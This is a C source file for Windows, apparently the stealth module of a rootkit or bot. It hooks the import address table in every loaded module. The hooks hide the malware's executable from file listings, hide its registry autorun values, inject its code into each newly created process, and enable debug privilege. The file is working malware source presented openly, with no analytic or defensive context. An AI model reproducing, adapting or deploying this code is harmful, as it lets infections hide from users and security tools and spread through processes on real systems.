// -------------------------------------------------------- //
#define MakePtr(Type, BaseAddr, RVA) ((Type)((DWORD)(BaseAddr) + (DWORD)(RVA)))
// -------------------------------------------------------- //
static DWORD WINAPI ReplaceIAT(PCSTR pszCModName, PROC pfnCurrent, PROC pfnNew, HMODULE hCModule)
{ 
	DWORD dwOrgProtect, dwBase;
	PSTR pszModName; ULONG ulSize;
	
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hCModule;

    if(pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) // MZ
		return FALSE; 

    PIMAGE_NT_HEADERS pNTHeaders = MakePtr(PIMAGE_NT_HEADERS, pDOSHeader, pDOSHeader -> e_lfanew);

    if(pNTHeaders->Signature != IMAGE_NT_SIGNATURE) // PE
		return FALSE;

	PIMAGE_IMPORT_DESCRIPTOR pIATDesc = (PIMAGE_IMPORT_DESCRIPTOR) 
				ImageDirectoryEntryToData(hCModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &ulSize);
				
	if (pIATDesc == NULL) 
		return FALSE;

	for (; pIATDesc->Name; pIATDesc++) 
	{
		pszModName = (PSTR) ((PBYTE) hCModule + pIATDesc->Name);
		
		if(lstrcmpi(pszModName, pszCModName) == 0)
			break; 
	}
	
	if (pIATDesc->Name == 0) 
		return FALSE;
	
	PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA) ((PBYTE) hCModule + pIATDesc->FirstThunk); 
	
	for (; pThunk->u1.Function; pThunk++) 
	{
		PROC* ppfn = (PROC*) &pThunk->u1.Function;

		if(*ppfn == pfnCurrent) 
		{ 

			BOOL bVProt = VirtualProtect(ppfn, sizeof(pfnNew), PAGE_READWRITE, &dwOrgProtect);
			
			if(bVProt == 0)
				return FALSE;

			WriteProcessMemory(GetCurrentProcess(),ppfn, &pfnNew,sizeof(pfnNew),NULL);
			
			VirtualProtect(ppfn, sizeof(pfnNew), dwOrgProtect , &dwOrgProtect);

			return TRUE;
		} 

	} 

		return FALSE;
}
// -------------------------------------------------------- //
static DWORD WINAPI ReplaceIATEntryInAllMods(PCSTR pszCModName, PROC pfnCurrent, PROC pfnNew) 
{
	HANDLE m_Snap = INVALID_HANDLE_VALUE;
	MODULEENTRY32 me = { sizeof(me) };
	
	m_Snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
	
	if (m_Snap == INVALID_HANDLE_VALUE) 
		return 0; 
		
	if (!Module32First(m_Snap, &me)) 
		return 0;

	do 
	{
		ReplaceIAT(pszCModName, pfnCurrent, pfnNew, me.hModule);
	} 
	while (Module32Next(m_Snap, &me)); 
	
	return 0;
}
// -------------------------------------------------------- //
static HANDLE WINAPI xFindFirstFileW (PCWSTR lpFileName, PWIN32_FIND_DATAW lpFindFileData)
{
	char 	szName[256];
	HANDLE ret = FindFirstFileW(lpFileName, lpFindFileData);
	WideCharToMultiByte(CP_ACP, 0, lpFindFileData->cFileName, -1, szName, 256, NULL, NULL);

	if (lstrcmpiA(szName, EXE_NAME) == 0)
	{
		if (!FindNextFileW(ret, lpFindFileData)) 
		{
			SetLastError(ERROR_NO_MORE_FILES);
			return INVALID_HANDLE_VALUE;
		}
	}
	return ret;
}
// -------------------------------------------------------- //
static BOOL WINAPI xFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	char 	szName[256];
	BOOL ret = FindNextFileW(hFindFile, lpFindFileData);
	WideCharToMultiByte(CP_ACP, 0,lpFindFileData->cFileName, -1, szName, 256, NULL, NULL);

	if (lstrcmpiA(szName, EXE_NAME) == 0)
	{
		ret = FindNextFileW(hFindFile, lpFindFileData);
	}
	return ret;
}

// -------------------------------------------------------- //
static LONG WINAPI xRegEnumValueW(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, 
				  LPDWORD lpcValueName,  LPDWORD lpReserved, 
				  LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData)
{
	char szName [MAX_PATH];

	LONG ret = RegEnumValueW(hKey, dwIndex, lpValueName, 
							lpcValueName,  lpReserved, lpType, lpData, lpcbData);
		
	WideCharToMultiByte(CP_ACP, 0, lpValueName, -1, szName, 256, NULL, NULL);

	if(strstr(szName,TASKS_PREFIX_Z) || lstrcmp(szName, REGNAME)==0) return 1;
	
	return ret;
}

// -------------------------------------------------------- //

static BOOL WINAPI xCreateProcessW(LPCWSTR lpApplicationName, 
	LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, 
	DWORD dwCreationFlags, LPVOID lpEnvironment, 
	LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, 
	LPPROCESS_INFORMATION lpProcessInformation)
{
	BOOL ret, b;	
	DWORD dwRmtThdID, dwStInj;	

	ret = CreateProcessW(lpApplicationName, lpCommandLine, 
							 lpProcessAttributes,
							 lpThreadAttributes, 
							 bInheritHandles, dwCreationFlags | CREATE_SUSPENDED, 
							 lpEnvironment, lpCurrentDirectory, 
							 lpStartupInfo, 
							 lpProcessInformation);

		dwStInj = StartProcInject(lpProcessInformation->dwProcessId, NULL, StealthMain, NULL);
		
		if(dwStInj)
		{
			ResumeThread(lpProcessInformation->hThread);
		}

	return ret;
}
// -------------------------------------------------------- //

static HMODULE WINAPI xLoadLibraryW(PCWSTR a)
{
	HMODULE ret = LoadLibraryW(a);
	if (ret != NULL)
	{
		SetUpStealthHooks(ret);
	}
	return ret;
}

// -------------------------------------------------------- //

static HMODULE WINAPI xLoadLibraryExW(PCWSTR a, HANDLE b, DWORD c)
{
	HMODULE ret = LoadLibraryExW(a,b,c);
	if ((ret!=NULL)&&(c & LOAD_LIBRARY_AS_DATAFILE)==0)
	{
		SetUpStealthHooks(ret);
	}
	return ret;
}	

// -------------------------------------------------------- //
void WINAPI StealthLoadDlls()
{
	LoadLibrary(KERNEL32_DLL);	// 1
	LoadLibrary(ADVAPI32_DLL);	// 2
	LoadLibrary(IMGHLP_DLL);	// 3
	LoadLibrary(SHELL32_DLL);	// 4
	LoadLibrary(WS2_32_DLL);	// 5
	LoadLibrary(WININET_DLL);	// 7
	LoadLibrary(USER32_DLL);	// 9
}

DWORD WINAPI StealthMain(LPVOID lpParam) 
{

	SetPrivilege(0x14, SE_DEBUG_PRIV, TRUE);

	StealthLoadDlls();
	
	Stealth();
	
	return TRUE;
}

// -------------------------------------------------------- //

DWORD WINAPI SetUpStealthHooks(HANDLE hmodCaller)
{
	ReplaceIAT // RegEnumValueW
	(
		ADVAPI32_DLL, 
		GetProcAddress(GetModuleHandle(ADVAPI32_DLL), "RegEnumValueW"),
		(PROC)xRegEnumValueW, 
		(struct HINSTANCE__ *)hmodCaller
	);

	ReplaceIAT // FindFirstFileW
	(
		KERNEL32_DLL,
		GetProcAddress(GetModuleHandle(KERNEL32_DLL), "FindFirstFileW"), 
		(PROC)xFindFirstFileW, 
		(struct HINSTANCE__ *)hmodCaller
	);
	
	ReplaceIAT // FindNextFileW
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindNextFileW"), 
		(PROC)xFindNextFileW, 
		(struct HINSTANCE__ *)hmodCaller
    );

	ReplaceIAT // LoadLibraryW
	(
		KERNEL32_DLL, 
		GetProcAddress(	GetModuleHandle(KERNEL32_DLL),"LoadLibraryW"), 
		(PROC)xLoadLibraryW, 
		(struct HINSTANCE__ *)hmodCaller
	);

	ReplaceIAT // LoadLibraryExW
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryExW"), 
		(PROC)xLoadLibraryExW, 
		(struct HINSTANCE__ *)hmodCaller
	);
	
	ReplaceIAT //CreateProcessW
	(
		ADVAPI32_DLL, 
		GetProcAddress(GetModuleHandle(ADVAPI32_DLL), "CreateProcessW"),
		(PROC)xCreateProcessW, 
		(struct HINSTANCE__ *)hmodCaller
	);
	
return 0;
}

// -------------------------------------------------------- //

static DWORD WINAPI Stealth()
{
	ReplaceIATEntryInAllMods
	(
		ADVAPI32_DLL, 
		GetProcAddress(GetModuleHandle(ADVAPI32_DLL),"RegEnumValueW"), 
		(PROC)xRegEnumValueW
	);

	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL), "CreateProcessW"), 
		(PROC)xCreateProcessW
	);

	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindFirstFileW"), 
		(PROC)xFindFirstFileW
	);
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL,
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"FindNextFileW"),
		(PROC)xFindNextFileW
	);
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryW"), 
		(PROC)xLoadLibraryW
	);	
	
	ReplaceIATEntryInAllMods
	(
		KERNEL32_DLL, 
		GetProcAddress(GetModuleHandle(KERNEL32_DLL),"LoadLibraryExW"),
		(PROC)xLoadLibraryExW
	);

	return 0; 
}